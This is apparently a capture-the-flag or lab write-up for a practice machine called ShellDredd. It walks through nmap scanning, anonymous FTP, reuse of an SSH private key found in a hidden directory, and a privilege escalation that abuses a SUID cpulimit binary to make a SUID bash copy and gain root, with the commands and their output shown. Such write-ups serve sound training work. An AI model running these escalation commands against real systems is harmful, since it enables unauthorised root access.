I started off with an nmap scan, initially found only one open port;

$ nmap -sC -sV 192.168.64.130
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.64.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Listing directory does not work. Time to dig deeper and found another open port:
$ nmap -p- --min-rate=10000 192.168.64.130

PORT      STATE SERVICE
21/tcp    open  ftp
61000/tcp open  unknown

Going even deeper on the new port
$ nmap -sC -sV -p 61000 192.168.64.130    

PORT      STATE SERVICE VERSION
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

This might be a good indicator that I need to bruteforce for ssh logon credentials or atleast the ones I can use with ftp.

Listing hidden directories, allowed me to access the private key in hannah directory.
I ssh in over the open port 61000 and get access to user flag.

Trying to lis commands on the system is restricted. I therefore proceed to check any file with SUID bit set.
find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd

After researching, of interest is the cpulimit binary. I head over to GTFOBINs and check what I can find.
Using the command below am able to break away from the restricted shell but sudo command not found still. Needs to dig deeper
cpulimit -l 100 -f /bin/sh
++++++++++++++++++++++++
After further research I realized one has to append the cpulimit command to each command as below to eventually get root:

$ cpulimit -l 100 -f mkdir /test
Process 7766 detected
Child process is finished, exiting...
$ cpulimit -l 100 -f chmod 4755 /usr/bin/bash
Process 7768 detected
Child process is finished, exiting...
$ cpulimit -l 100 -f cp /usr/bin/bash /test
Process 7770 detected
Child process is finished, exiting...
$ cd /test
$ ls
bash
hannah@ShellDredd:/test$ cpulimit -l 100 -f chmod +s /test/bash
Process 7779 detected
Child process is finished, exiting...
hannah@ShellDredd:/test$ ./bash -p
bash-5.0# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root)

And finally I get the roor flag and that is the box!
